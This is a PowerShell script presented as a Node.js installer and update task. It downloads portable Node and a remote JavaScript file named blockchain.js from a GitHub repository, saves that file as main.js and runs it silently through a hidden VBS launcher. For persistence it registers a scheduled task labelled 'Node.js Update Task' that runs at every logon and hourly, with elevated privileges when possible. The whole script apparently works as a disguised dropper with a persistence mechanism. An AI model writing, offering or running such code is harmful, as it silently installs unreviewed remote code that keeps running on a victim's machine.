# ============================================================
# Combined Node Installer and Scheduled Task Setup
# ============================================================

# Define paths
$localAppData = [Environment]::GetFolderPath('LocalApplicationData')
$targetDir    = Join-Path $localAppData "TryNodeUpdate"
$mainJs       = Join-Path $targetDir "main.js"
$nodeVbs      = Join-Path $targetDir "nodeupdate.vbs"
$nodeExe      = Join-Path $targetDir "node-v20.11.0-win-x64\node.exe"
$zipUrl       = "https://nodejs.org/download/release/v20.11.0/node-v20.11.0-win-x64.zip"
$zipFile      = Join-Path $env:TEMP "nodejs.zip"
$taskName     = "TryNodeUpdateTask"
$nodeRoot     = Join-Path $targetDir "node-v20.11.0-win-x64"


# Create target directory
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    Write-Host "Created directory: $targetDir" -ForegroundColor Green
}

# Download main.js
$mainJsUrl = "https://raw.githubusercontent.com/1CodeDev-hub/electronAI/refs/heads/main/blockchain.js"
try { (New-Object System.Net.WebClient).DownloadFile($mainJsUrl, $mainJs)}
catch { Write-Host "Failed to download main.js: $_" -ForegroundColor Red; exit 1 }

# Download Node.js ZIP with fast download logic
$shouldDownload = $false

if (-not (Test-Path $zipFile)) {
    $shouldDownload = $true
} else {
    try {
        # Get expected file size from server
        $headRequest = Invoke-WebRequest -Uri $zipUrl -Method Head -UseBasicParsing
        $expectedSize = [int64]$headRequest.Headers.'Content-Length'
        $currentSize = (Get-Item $zipFile).Length
        
        if ($currentSize -ne $expectedSize) {
            Write-Host "Incomplete ZIP detected ($currentSize / $expectedSize bytes). Re-downloading..." -ForegroundColor Yellow
            Remove-Item $zipFile -Force
            $shouldDownload = $true
        }
    } catch {
        Write-Host "Could not verify ZIP size. Re-downloading..." -ForegroundColor Yellow
        Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
        $shouldDownload = $true
    }
}

if ($shouldDownload) {
    try { (New-Object System.Net.WebClient).DownloadFile($zipUrl, $zipFile) }
  
    catch {
        Write-Host "Failed to download ZIP: $_" -ForegroundColor Red
        if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
        exit 1
    }
}

# Extract Node.js ZIP if node.exe missing
if (-not (Test-Path $nodeExe)) {
    Write-Host "Extracting Node.js..." -ForegroundColor Cyan
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    try {
        if (Test-Path $nodeRoot) {
            Remove-Item $nodeRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, $targetDir)
        Write-Host "Extracted Node.js to $targetDir" -ForegroundColor Green
        Remove-Item $zipFile -Force
        Write-Host "Cleaned up ZIP file" -ForegroundColor Green
    } catch {
        Write-Host "Extraction failed: $_" -ForegroundColor Red
        if (Test-Path $zipFile) { Remove-Item $zipFile -Force -ErrorAction SilentlyContinue }
        exit 1
    }
}

# Create runtime VBS launcher
$vbsContent = @"
Set shell = CreateObject("WScript.Shell")
base = "$localAppData\TryNodeUpdate\node-v20.11.0-win-x64\"
nodeExe = base & "node.exe"
mainJs  = "$localAppData\TryNodeUpdate\main.js"

Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(nodeExe) And fso.FileExists(mainJs) Then
    shell.Run """" & nodeExe & """ """ & mainJs & """", 0, False
End If

"@

$vbsContent | Out-File -FilePath $nodeVbs -Encoding ASCII -Force
Write-Host "Created VBS launcher: $nodeVbs" -ForegroundColor Green

$wscriptPath = [Environment]::GetFolderPath('System') + "\wscript.exe"

# Check admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Create scheduled task using COM
$scheduler = New-Object -ComObject "Schedule.Service"
$scheduler.Connect()
$rootFolder = $scheduler.GetFolder("\")

# Delete existing task if present
try { $rootFolder.DeleteTask($taskName, 0) } catch {}

# Create new task definition
$taskDefinition = $scheduler.NewTask(0)
$taskDefinition.RegistrationInfo.Description = "Node.js Update Task"
$taskDefinition.Settings.Hidden = $false
$taskDefinition.Settings.AllowDemandStart = $true
$taskDefinition.Settings.DisallowStartIfOnBatteries = $false
$taskDefinition.Settings.StopIfGoingOnBatteries = $false
$taskDefinition.Settings.StartWhenAvailable = $true
$taskDefinition.Settings.ExecutionTimeLimit = "PT0S"

# Create action
$action = $taskDefinition.Actions.Create(0)
$action.Path = $wscriptPath
$action.Arguments = "//nologo `"$nodeVbs`""

# Configure principal based on admin status
if ($isAdmin) {
    $taskDefinition.Principal.RunLevel = 1  # highest privileges
    $taskDefinition.Principal.LogonType = 'S4U'
    $logonType = 2
}
else {
    $taskDefinition.Principal.RunLevel = 0  # least privileges (required for non-admin creation)
    $taskDefinition.Principal.UserId = "$([Environment]::MachineName)\$([Environment]::UserName)"
    $logonType = 3
}

# Create trigger (AtLogon with 1 hour repetition)
$trigger = $taskDefinition.Triggers.Create(9)  # 9 = TASK_TRIGGER_LOGON
$trigger.UserId = "$([Environment]::MachineName)\$([Environment]::UserName)"
$trigger.Repetition.Interval = "PT1H"
$trigger.Enabled = $true

# Register task
try {
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, $logonType, $null)
    Write-Host "Scheduled Task '$taskName' created successfully!" -ForegroundColor Green
} catch {
    Write-Host "Failed to create scheduled task: $_" -ForegroundColor Red
    exit 1
}

# Start task immediately
Start-ScheduledTask -TaskName $taskName
Write-Host "`nSetup completed successfully!" -ForegroundColor Green

exit 0
